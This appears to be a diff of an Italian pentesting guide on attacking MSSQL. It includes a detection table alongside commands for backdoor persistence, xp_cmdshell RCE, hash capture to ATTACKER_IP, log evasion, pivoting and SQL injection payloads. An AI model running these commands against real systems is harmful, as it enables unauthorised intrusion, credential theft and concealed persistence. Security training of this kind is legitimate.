+EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';
+
+-- Job SQL Server Agent che esegue comandi a intervalli (msdb)
+EXEC msdb.dbo.sp_add_job @job_name = 'WindowsUpdateCheck';
+EXEC msdb.dbo.sp_add_jobstep @job_name = 'WindowsUpdateCheck',
+  @command = 'EXEC master..xp_cmdshell ''whoami''';
+```
+
+Un job in `msdb` camuffato con un nome plausibile passa spesso inosservato in un audit veloce.
+
+***
+
+## 15. Detection e Difesa {#15}
+
+Ogni tecnica sopra ha una controparte difensiva concreta.
+
+| Attacco                           | Come rilevarlo                                                             | Come mitigarlo                                                                     |
+| --------------------------------- | -------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
+| Brute force / credenziali default | Alert su login falliti ripetuti nel SQL Server Audit Log                   | Disabilita `sa`, policy password forte, MFA dove possibile                         |
+| `xp_dirtree` per hash capture     | Traffico SMB in uscita anomalo verso IP esterni                            | Blocca SMB in uscita a livello firewall, disabilita `xp_dirtree` se non serve      |
+| `xp_cmdshell`                     | Processo `cmd.exe`/`powershell.exe` figlio di `sqlservr.exe`               | Disabilita xp\_cmdshell se non necessario; EDR con regola su questo parent-child   |
+| OLE Automation / Python script    | Enumerazione config `sp_configure` seguita da esecuzione anomala           | Disabilita `Ole Automation Procedures` e `sp_execute_external_script` se non usati |
+| Impersonation abuse               | Query su `sys.server_permissions` seguite da `EXECUTE AS LOGIN` verso `sa` | Audit periodico su chi ha `IMPERSONATE`, principio del minimo privilegio           |
+| Linked server pivoting            | Query `OPENQUERY`/`EXEC ... AT` verso server esterni non abituali          | Rimuovi linked server non necessari, usa mapping con account a basso privilegio    |
+| Persistenza via job SQL Agent     | Job con nomi generici creati fuori orario, comandi xp\_cmdshell nello step | Audit periodico su `msdb.dbo.sysjobs`, alerting su creazione job                   |
+
+> **Trucco OPSEC lato attaccante (utile da conoscere anche in difesa):** aggiungendo `sp_password` in coda a una query, SQL Server sostituisce automaticamente il testo della query nei log con un placeholder generico, per evitare che password finiscano nei log in chiaro. Un attaccante può abusarne per nascondere un payload dai log — un blue team dovrebbe quindi diffidare di eventi con testo oscurato senza una password apparente nella query.
+
 ***
 
 ## 16. Tool Completo {#16}
 
-| Tool                     | Uso                     | Comando base                              |
-| ------------------------ | ----------------------- | ----------------------------------------- |
-| **impacket-mssqlclient** | Shell interattiva       | `mssqlclient.py sa:pass@IP`               |
-| **nxc / CrackMapExec**   | Brute force, enum, exec | `nxc mssql IP -u sa -p pass`              |
-| **sqlmap**               | Injection automatica    | `sqlmap -r req.txt -p param --dbms=mssql` |
-| **Responder**            | Hash capture            | `responder -I tun0`                       |
-| **sqsh**                 | Client alternativo      | `sqsh -S IP -U user -P pass`              |
-| **MSSQLPwner**           | Pivoting linked server  | `mssqlpwner corp.com/user:pass@IP`        |
-| **Metasploit**           | Moduli MSSQL            | `use auxiliary/admin/mssql/mssql_enum`    |
+| Tool                     | Uso                                            | Comando base                                                                 |
+| ------------------------ | ---------------------------------------------- | ---------------------------------------------------------------------------- |
+| **impacket-mssqlclient** | Shell interattiva                              | `mssqlclient.py sa:pass@IP`                                                  |
+| **nxc / CrackMapExec**   | Brute force, enum, exec                        | `nxc mssql IP -u sa -p pass`                                                 |
+| **Responder**            | Hash capture                                   | `responder -I tun0`                                                          |
+| **sqsh**                 | Client alternativo                             | `sqsh -S IP -U user -P pass`                                                 |
+| **PowerUpSQL**           | Toolkit di audit completo (Windows)            | `Invoke-SQLOSCmd -Username sa -Password pass -Instance HOST -Command whoami` |
+| **MSSqlPwner**           | Attraversa catene di linked server, relay NTLM | `mssqlpwner corp.com/user:pass@IP -windows-auth interactive`                 |
+| **mssqlproxy**           | Trasforma il DB in un tunnel SOCKS5 (pivoting) | `mssqlproxy.py -q sa:pass@IP`                                                |
+| **Metasploit**           | Moduli MSSQL                                   | `use auxiliary/admin/mssql/mssql_enum`                                       |
+
+**PowerUpSQL — enumerazione da un host di dominio già Windows-authenticated:**
+
+```powershell
+Get-SQLInstanceDomain | Get-SQLDatabase
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "username,password" -SampleSize 10
+Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"
+```
 
 **Metasploit — moduli utili:**
 
 ```
 auxiliary/scanner/mssql/mssql_ping
 auxiliary/admin/mssql/mssql_enum
-admin/mssql/mssql_escalate_execute_as
-admin/mssql/mssql_escalate_dbowner
-exploit/windows/mssql/mssql_linkcrawler
-auxiliary/admin/mssql/mssql_exec
+auxiliary/admin/mssql/mssql_escalate_execute_as
+auxiliary/admin/mssql/mssql_escalate_dbowner
 auxiliary/scanner/mssql/mssql_hashdump
 ```
 
@@ -1055,165 +828,146 @@ auxiliary/scanner/mssql/mssql_hashdump
 
 ## 17. Percorso Operativo Consigliato {#17}
 
-Sia che tu parta dalla porta 1433 che da una SQLi web, il percorso logico è questo:
-
 ```
-1. TROVA MSSQL
+1. ENUMERA LA PORTA
    └─ nmap -sV -sC -p 1433,1434
-   └─ parametro web vulnerabile
 
 2. ACCEDI
-   └─ credenziali deboli / brute force → mssqlclient
-   └─ SQL injection web → UNION / blind / stacked
+   └─ credenziali deboli / brute force → mssqlclient.py
 
-3. ENUMERA
-   └─ DB_NAME(), SYSTEM_USER, versione
-   └─ lista database → tabelle → colonne → dati
+3. ORIENTATI
+   └─ SELECT @@VERSION, SYSTEM_USER, DB_NAME()
+   └─ SELECT name FROM sys.databases → USE db → tabelle → colonne → dati
+
+4. CAPISCI I TUOI PRIVILEGI
    └─ IS_SRVROLEMEMBER('sysadmin')
 
-4. HASH CAPTURE (anche senza sysadmin)
-   └─ xp_dirtree → Responder → hashcat -m 5600
-   └─ se hash macchina ($) → ntlmrelayx relay
+5. ENUMERAZIONE APPROFONDITA
+   └─ sys.configurations, database trustworthy, job SQL Agent
+   └─ stored procedure/view custom, credential, ricerca colonne sensibili
 
-5. SCALA PRIVILEGI (se non sei sysadmin)
+6. HASH CAPTURE (anche senza sysadmin)
+   └─ xp_dirtree → Responder → hashcat -m 5600
+
+7. SE NON SEI SYSADMIN
    └─ IMPERSONATE → EXECUTE AS LOGIN='sa'
    └─ db_owner + trustworthy → sp_elevate
-   └─ linked server con mapping privilegiato
 
-6. RCE (con sysadmin)
-   └─ sp_configure xp_cmdshell → EXEC master..xp_cmdshell
-   └─ whoami /priv → SeImpersonatePrivilege? → Potato attack
-   └─ alternativa stealth: OLE Automation, Python
+8. RCE (con sysadmin)
+   └─ xp_cmdshell o alternative stealth (OLE, Python)
 
-7. LINKED SERVER
-   └─ sys.servers → EXECUTE AT
-   └─ sp_helplinkedsrvlogin → verifica account remoto
-   └─ chain SQL01 → SQL02 → SQL03
-
-8. AD EXPOSURE
-   └─ DEFAULT_DOMAIN()
-   └─ GetUserSPNs → Kerberoasting del service account
-   └─ nxc --rid-brute → enum utenti dominio
+9. ESPANDI
+   └─ Linked server → EXECUTE AT
+   └─ DEFAULT_DOMAIN() → Kerberoasting service account
 ```
 
 ***
 
 ## 18. Troubleshooting {#18}
 
-| Problema                        | Causa                              | Soluzione                                     |
-| ------------------------------- | ---------------------------------- | --------------------------------------------- |
-| Errore con `'` ma non `''`      | Stringa confermata                 | Prova `'-- -`, `')-- -`, `'))-- -`            |
-| UNION funziona ma nessun output | Colonna visibile sbagliata         | Prova `'hackita'` in ogni posizione           |
-| sqlmap non fingerprinta         | WAF blocca query MSSQL             | `--string="val" --flush-session --no-cast`    |
-| sqlmap identifica FrontBase     | Falso positivo WAF                 | `--dbms=mssql --string="val" --flush-session` |
-| `xp_cmdshell` negato            | Non sysadmin                       | Cerca impersonation o trustworthy DB          |
-| Hash NTLMv2 account `$`         | Account macchina — password random | Usa ntlmrelayx invece di craccare             |
-| Stacked query non eseguono      | App non supporta multi-statement   | Usa solo UNION o error-based                  |
-| `WAITFOR` senza ritardo         | App usa timeout basso              | Aumenta a 10-15 secondi                       |
-| Linked server errore            | Mapping credenziali sbagliato      | `EXEC sp_helplinkedsrvlogin 'NOME'`           |
+| Problema                                    | Causa                                  | Soluzione                                          |
+| ------------------------------------------- | -------------------------------------- | -------------------------------------------------- |
+| "Invalid object name 'tabella'"             | Non hai fatto `USE database;` prima    | Esegui `USE NomeDB;` poi ripeti la query           |
+| `xp_cmdshell` negato                        | Non sei sysadmin                       | Cerca impersonation o database trustworthy         |
+| Hash NTLMv2 con username che finisce in `$` | È un account macchina, password random | Passa a `ntlmrelayx.py` invece di craccare         |
+| `sp_configure` non applica la modifica      | Manca `RECONFIGURE` dopo il comando    | Esegui sempre `RECONFIGURE;` subito dopo           |
+| Linked server dà errore di permessi         | Mapping credenziali sbagliato          | `EXEC sp_helplinkedsrvlogin 'NOME'` per verificare |
 
 ***
 
 ## 19. FAQ {#19}
 
-**Come capisco se è MSSQL e non MySQL?**
-Usa `' AND @@CONNECTIONS>0-- -` (solo MSSQL) o `' AND 1=CONVERT(int,@@VERSION)-- -`. Se MySQL, @@CONNECTIONS non esiste.
+**Come faccio a sapere quanti privilegi ho su un'istanza MSSQL?**
+Esegui `SELECT IS_SRVROLEMEMBER('sysadmin');` — se torna `1` sei sysadmin. Per il dettaglio completo usa `SELECT * FROM fn_my_permissions(NULL,'SERVER');`.
 
-**`-- -` e `--` sono identici?**
-Quasi. `--` richiede uno spazio dopo per standard SQL. `-- -` è `--` + spazio + `-` — lo spazio garantisce validità su tutti i parser. In MSSQL funziona anche `--` senza spazio, ma `-- -` è più robusto.
+**Posso vedere le tabelle senza sapere il nome del database?**
+Sì: prima `SELECT name FROM sys.databases;` per la lista, poi `USE nome;` seguito da `SELECT table_name FROM information_schema.tables;`.
 
-**Perché aggiungere `;` alla fine di un payload stacked?**
-Il `;` finale chiude esplicitamente il secondo statement prima del commento: `'; EXEC xp_cmdshell 'cmd';-- -`. Alcuni parser richiedono la chiusura esplicita — è buona pratica includerlo sempre.
+**xp\_dirtree funziona anche da utente non-sysadmin?**
+Spesso sì — è uno dei motivi per cui è così usato: verifica con `EXEC sp_helprotect 'xp_dirtree';` chi ha i permessi.
 
-**Quando uso `'` e quando `')`?**
-Dipende dal contesto. Se l'errore sparisce con `')`, la query usa parentesi: `WHERE (colonna = 'INPUT')`.
-
-**Posso fare hash capture senza sysadmin?**
-Sì. `xp_dirtree` non richiede sysadmin — basta avere EXECUTE sulla stored procedure. Verifica con `EXEC sp_helprotect 'xp_dirtree'`.
+**Quando NON conviene usare xp\_cmdshell?**
+Quando c'è un EDR attivo che monitora processi figli di `sqlservr.exe`: in quel caso OLE Automation o `sp_execute_external_script` (Python) lasciano meno tracce.
 
 **Il service account MSSQL è sempre Kerberoastable?**
-Solo se ha un SPN registrato. Quasi sempre ce l'ha: `MSSQLSvc/hostname:1433`.
-
-**Come ottengo RCE da una SQL Injection su MSSQL?**
-Conferma injection → verifica stacked queries con `WAITFOR` → se sysadmin abilita `xp_cmdshell` → `EXEC master..xp_cmdshell 'cmd'`. Se non sei sysadmin, cerca impersonation o linked server.
+Solo se ha un SPN registrato — quasi sempre ce l'ha (`MSSQLSvc/hostname:1433`).
 
 ***
 
 ## 20. Cheat Sheet Finale {#20}
 
 ```
-=== PORTA 1433 ===
-Scan:     nmap -sV -sC -p 1433,1434 TARGET
-Named:    nmap -sU -p 1434 TARGET → poi scan porte dinamiche
-Brute:    nxc mssql TARGET -u sa -p pass.txt
-Connect:  mssqlclient.py sa:pass@TARGET
-Win auth: mssqlclient.py -windows-auth CORP/user:pass@TARGET
+=== ENUMERAZIONE PORTA ===
+nmap -sV -sC -p 1433 TARGET
+nmap -sU -p 1434 TARGET          (istanze named)
 
-=== CONTESTO WEB ===
-Stringa:    '  → chiudi con '
-Parentesi:  ') → chiudi con ')
-Intero:     nessun apice
+=== ACCESSO ===
+mssqlclient.py sa:pass@TARGET
+mssqlclient.py -windows-auth CORP/user:pass@TARGET
+nxc mssql TARGET -u sa -p pass.txt
 
-=== COMMENTI ===
-POST/Burp:  -- -
-GET URL:    --+
-Spazi:      /**/ al posto degli spazi
+=== ORIENTARSI ===
+SELECT @@VERSION;
+SELECT SYSTEM_USER;
+SELECT DB_NAME();
+SELECT name FROM sys.databases;
+USE NomeDB;
+SELECT table_name FROM information_schema.tables;
+SELECT column_name FROM information_schema.columns WHERE table_name='X';
+SELECT * FROM X;
 
-=== VARIANTI DA PROVARE (in ordine) ===
-' UNION SELECT 1,2,3-- -
-') UNION SELECT 1,2,3-- -
-' UNION SELECT NULL,NULL,NULL-- -
-'/**/UNION/**/SELECT/**/1,2,3-- -
-'+UNION+SELECT+1,2,3-- -
-'; SELECT 1;-- -               (conferma stacked)
-'; WAITFOR DELAY '0:0:5';-- -  (conferma time-based)
+=== PRIVILEGI ===
+SELECT IS_SRVROLEMEMBER('sysadmin');
+SELECT * FROM fn_my_permissions(NULL,'SERVER');
 
-=== ENUM ===
-DB corrente:  DB_NAME(), SYSTEM_USER, @@SERVERNAME
-Lista DB:     FROM master..sysdatabases
-Tabelle:      FROM NomeDB..sysobjects WHERE xtype='U'
-Colonne:      FROM NomeDB.information_schema.columns WHERE table_name='X'
-Dump:         SELECT col1+':'+col2 FROM DB..Table
-Tutto:        FOR XML PATH('')
+=== ENUMERAZIONE APPROFONDITA ===
+SELECT * FROM sys.configurations;                          (xp_cmdshell, CLR, ecc.)
+SELECT name,SUSER_SNAME(owner_sid),is_trustworthy_on FROM sys.databases;
+SELECT * FROM msdb.dbo.sysjobs; msdb.dbo.sysjobsteps;
+SELECT * FROM sys.credentials; msdb.dbo.sysproxies;
+SELECT name FROM sys.procedures;  → EXEC sp_helptext 'Nome';
+SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%password%';
 
 === HASH CAPTURE (no sysadmin) ===
-'; EXEC xp_dirtree '\\ATTACKER_IP\share';-- -
-→ Responder: sudo responder -I tun0 -v
-→ Crack: hashcat -m 5600 hash.txt rockyou.txt
-→ Relay: ntlmrelayx.py se hash macchina ($)
+EXEC master.dbo.xp_dirtree '\\ATTACKER_IP\share';
+responder -I tun0 -v
+hashcat -m 5600 hash.txt rockyou.txt
 
 === RCE (sysadmin) ===
-One liner: EXEC sp_configure 'Show Advanced Options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
-Esegui:    EXEC master..xp_cmdshell 'whoami'
-Bypass:    DECLARE @x='xp_cmdshell'; EXEC @x 'whoami'
-SeImpersonate → GodPotato / PrintSpoofer
+EXEC sp_configure 'show advanced options',1;RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
+EXEC master..xp_cmdshell 'whoami';
 
 === PRIVESC ===
-Impersonation:  sys.server_permissions WHERE permission_name='IMPERSONATE'
-TrustWorthy:    sys.databases WHERE is_trustworthy_on=1 + db_owner
-Linked server:  sys.servers WHERE is_linked=1 → sp_helplinkedsrvlogin → EXECUTE AT
+EXECUTE AS LOGIN='sa';  → impersonation
+sys.databases WHERE is_trustworthy_on=1 + db_owner → sp_elevate
 
-=== OPSEC ===
-Nascondi dai log: payload-- -sp_password
-Meno rumore:     OLE Automation, sp_execute_external_script
-Pulizia:         DROP PROCEDURE sp_elevate; xp_cmdshell disabilita dopo uso
+=== LINKED SERVER ===
+SELECT name FROM sys.servers WHERE is_linked=1;
+EXEC ('whoami') AT [LINKED];
+
+=== PIVOTING (solo 1433 raggiungibile) ===
+mssqlproxy.py -q sa:pass@TARGET  → tunnel SOCKS5 + proxychains
+
+=== AD ===
+SELECT DEFAULT_DOMAIN();
+GetUserSPNs.py corp.local/user:pass -request | grep MSSQL
 ```
 
 ***
 
 ## Riferimenti
 
+* [HackTricks – Pentesting MSSQL](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
 * [PayloadsAllTheThings – MSSQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
-* [pentestmonkey – MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+* [NetSPI – Decrypting MSSQL Linked Server Passwords](https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-database-link-server-passwords/)
 
 **Guide correlate su hackita.it:**
 
-* [SQL Injection: Guida Introduttiva](https://hackita.it/articoli/sql-injection)
-* [Blind SQL Injection e Automazione con Python](https://hackita.it/articoli/blind-sql-injection)
-* [sqlmap: Guida Completa](https://hackita.it/articoli/sqlmap)
+* [SQL Injection su MSSQL: guida web](https://hackita.it/articoli/sql-injection-mssql/)
+* [Impacket: Guida Completa](https://hackita.it/articoli/impacket)
 * [Responder: Hash Capture e NTLM Relay](https://hackita.it/articoli/responder)
 * [Kerberoasting e Service Account Attack](https://hackita.it/articoli/kerberos)
 * [Active Directory Enumeration con BloodHound](https://hackita.it/articoli/active-directory)
-* [Burp Suite: Intercettare e Modificare Richieste HTTP](https://hackita.it/articoli/burp-suite)
 
 > Uso esclusivo in ambienti autorizzati.
